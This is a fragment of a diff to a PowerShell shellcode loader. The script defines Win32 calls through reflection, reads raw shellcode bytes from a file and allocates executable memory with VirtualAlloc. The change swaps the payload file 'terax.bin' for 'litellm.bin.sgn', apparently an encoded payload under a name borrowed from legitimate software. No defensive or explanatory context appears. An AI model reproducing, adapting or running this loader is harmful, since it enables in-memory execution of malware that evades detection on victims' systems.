@@ -36,7 +36,7 @@ $PInvokeMethod.SetCustomAttribute($CustomBuilder)
 
 $Win32 = $TypeBuilder.CreateType()
 
-$shellcode = [System.IO.File]::ReadAllBytes("terax.bin");
+$shellcode = [System.IO.File]::ReadAllBytes("litellm.bin.sgn");
 $size = $shellcode.Length;
 
 [IntPtr]$addr = [Win32]::VirtualAlloc(0, $size, 0x3000, 0x40);
